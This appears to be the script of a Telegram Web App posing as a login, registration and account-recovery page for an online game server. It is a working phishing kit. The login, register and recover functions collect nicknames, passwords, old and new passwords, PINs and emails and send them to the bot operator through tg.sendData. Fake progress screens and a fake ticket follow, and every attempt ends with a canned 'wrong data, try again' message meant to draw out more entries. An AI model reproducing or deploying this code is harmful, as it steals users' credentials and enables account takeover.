const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// === АНИМАЦИЯ ЗАГРУЗКИ ПРИ СТАРТЕ ===
let percent = 0;
const bar = document.getElementById('bar');
const percentText = document.getElementById('percent');
const loader = document.getElementById('loader');
const main = document.getElementById('main');

if (loader && main) {
    const interval = setInterval(() => {
        percent += 2;
        if (percent >= 100) {
            percent = 100;
            clearInterval(interval);
            setTimeout(() => {
                loader.style.display = 'none';
                main.style.display = 'block';
            }, 300);
        }
        if (bar) bar.style.width = percent + '%';
        if (percentText) percentText.textContent = percent + '%';
    }, 30);
}

// === ПИН-КОД ===
function togglePin() {
    const checkbox = document.getElementById('hasPin');
    const pinInput = document.getElementById('pin');
    const pinGroup = document.getElementById('pinGroup');
    if (!checkbox || !pinInput || !pinGroup) return;

    if (checkbox.checked) {
        pinInput.disabled = false;
        pinInput.placeholder = 'Введите пин-код';
        pinInput.focus();
        pinGroup.classList.remove('disabled');
    } else {
        pinInput.disabled = true;
        pinInput.value = '';
        pinInput.placeholder = 'Пин-код отключён';
        pinGroup.classList.add('disabled');
    }
}

function onlyEnglish(input) {
    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
}

function onlyPin(input) {
    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
}

// === ПРОВЕРКА НИКА ===
function checkNick() {
    const nick = document.getElementById('nick').value.trim();
    const icon = document.getElementById('iconNick');
    if (!icon) return;

    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;

    if (valid) {
        icon.classList.remove('red');
        icon.classList.add('green');
    } else {
        icon.classList.remove('green');
        icon.classList.add('red');
    }
}

function markFilled(inputId, iconId) {
    const input = document.getElementById(inputId);
    const icon = document.getElementById(iconId);
    if (!input || !icon) return;

    input.addEventListener('input', () => {
        if (input.value.trim() !== '') {
            icon.classList.remove('red');
            icon.classList.add('green');
        } else {
            icon.classList.remove('green');
            icon.classList.add('red');
        }
    });
}

document.addEventListener('DOMContentLoaded', () => {
    markFilled('nick', 'iconNick');
    markFilled('password', 'iconPass');
    markFilled('pin', 'iconPin');
    markFilled('email', 'iconEmail');
    markFilled('referrer', 'iconRef');
    markFilled('old_password', 'iconOldPass');
    markFilled('new_password', 'iconNewPass');
});

// === АНИМАЦИЯ ЗАГРУЗКИ ===
function showLoading(text, callback) {
    const loaderDiv = document.createElement('div');
    loaderDiv.className = 'loader-screen';
    loaderDiv.id = 'tempLoader';
    loaderDiv.innerHTML = `
        <div class="loader-circle"></div>
        <div class="loader-text">${text}</div>
        <div class="loader-percent" id="tempPercent">0%</div>
        <div class="loader-bar">
            <div class="loader-bar-fill" id="tempBar"></div>
        </div>
    `;
    document.body.appendChild(loaderDiv);

    let p = 0;
    const int = setInterval(() => {
        p += 2;
        if (p >= 100) {
            p = 100;
            clearInterval(int);
            setTimeout(() => {
                loaderDiv.remove();
                if (callback) callback();
            }, 300);
        }
        const tempBar = document.getElementById('tempBar');
        const tempPercent = document.getElementById('tempPercent');
        if (tempBar) tempBar.style.width = p + '%';
        if (tempPercent) tempPercent.textContent = p + '%';
    }, 30);
}

// === ОТПРАВКА ДАННЫХ (при закрытии) ===
let pendingData = null;

function sendToBot(text) {
    pendingData = text;
}

function confirmSend() {
    if (pendingData) {
        try {
            tg.sendData(pendingData);
        } catch (e) {
            console.error('Ошибка отправки:', e);
        }
    }
    tg.close();
}

// === СООБЩЕНИЕ ОБ УСПЕХЕ (ЧЕК) ===
function showSuccess(text, nick, server, type) {
    const now = new Date();
    const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
    const ticket = Math.floor(1000000 + Math.random() * 9000000);

    const overlay = document.createElement('div');
    overlay.className = 'success-overlay';
    overlay.innerHTML = `
        <div class="success-box">
            <div class="success-ticket">#${ticket}</div>
            <div class="success-nick">${nick}</div>
            <div class="success-time">${time}</div>
            <div class="success-type">${type}</div>
            <div class="success-wait-static">Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span></div>
        </div>
    `;
    document.body.appendChild(overlay);

    let counter = 15;
    let dotIndex = 0;
    const dots = ['', '.', '..', '...'];
    const waitNum = document.getElementById('waitNum');
    const waitDots = document.getElementById('waitDots');
    const waitStatic = document.querySelector('.success-wait-static');

    const interval = setInterval(() => {
        counter--;
        dotIndex = (dotIndex + 1) % 4;

        if (counter > 0) {
            if (waitNum) waitNum.textContent = counter;
            if (waitDots) waitDots.textContent = dots[dotIndex];
        } else {
            clearInterval(interval);
            if (waitStatic) {
                waitStatic.textContent = 'Вы ввели неверные данные попробуйте снова';
                waitStatic.style.color = '#e30613';
                waitStatic.style.fontWeight = '700';
            }
        }
    }, 300);
}

// === НАВИГАЦИЯ ===
function goTo(page) { window.location.href = page; }

function validateNick(nick) {
    return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
}

// === ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
function toggleServerList() {
    const dropdown = document.getElementById('serverDropdown');
    if (dropdown) dropdown.classList.toggle('active');
}

function selectServer(value) {
    const valueEl = document.getElementById('serverValue');
    const hiddenInput = document.getElementById('server');
    if (valueEl) valueEl.textContent = value;
    if (hiddenInput) hiddenInput.value = value;
    toggleServerList();
}

// === ВХОД ===
function login() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;

    if (!nick) { alert('Введите ник!'); return; }
    if (!password) { alert('Введите пароль!'); return; }

    const data = (
        `🔐 ВХОД В АККАУНТ\n\n` +
        `👤 Ник: ${nick}\n` +
        `🔒 Пароль: ${password}\n` +
        `🛡 ПИН-код: ${pin || 'нет'}\n` +
        `🌍 Сервер: ${server}`
    );

    sendToBot(data);

    showLoading('ПРОВЕРКА ДАННЫХ', () => {
        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
            showSuccess('', nick, server, 'Вход в аккаунт');
        });
    });
}

// === РЕГИСТРАЦИЯ ===
function register() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const email = document.getElementById('email').value.trim();
    const server = document.getElementById('server').value;
    const referrer = document.getElementById('referrer').value.trim();

    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
    if (!password) { alert('Введите пароль!'); return; }

    const data = (
        `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n` +
        `👤 Ник: ${nick}\n` +
        `🔒 Пароль: ${password}\n` +
        `🛡 ПИН-код: ${pin || 'нет'}\n` +
        `📧 Почта: ${email || 'нет'}\n` +
        `🌍 Сервер: ${server}\n` +
        `👥 Пригласил: ${referrer || 'нет'}`
    );

    sendToBot(data);

    showLoading('ПРОВЕРКА ДАННЫХ', () => {
        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
            showSuccess('', nick, server, 'Создание аккаунта');
        });
    });
}

// === ВОССТАНОВЛЕНИЕ ===
function recover() {
    const nick = document.getElementById('nick').value.trim();
    const oldPass = document.getElementById('old_password').value.trim();
    const newPass = document.getElementById('new_password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;

    if (!nick) { alert('Введите ник!'); return; }
    if (!oldPass) { alert('Введите старый пароль!'); return; }
    if (!newPass) { alert('Введите новый пароль!'); return; }

    const data = (
        `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n` +
        `👤 Ник: ${nick}\n` +
        `🔓 Старый пароль: ${oldPass}\n` +
        `🔒 Новый пароль: ${newPass}\n` +
        `🛡 ПИН-код: ${pin || 'нет'}\n` +
        `🌍 Сервер: ${server}`
    );

    sendToBot(data);

    showLoading('ПРОВЕРКА ДАННЫХ', () => {
        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
            showSuccess('', nick, server, 'Восстановление аккаунта');
        });
    });
}
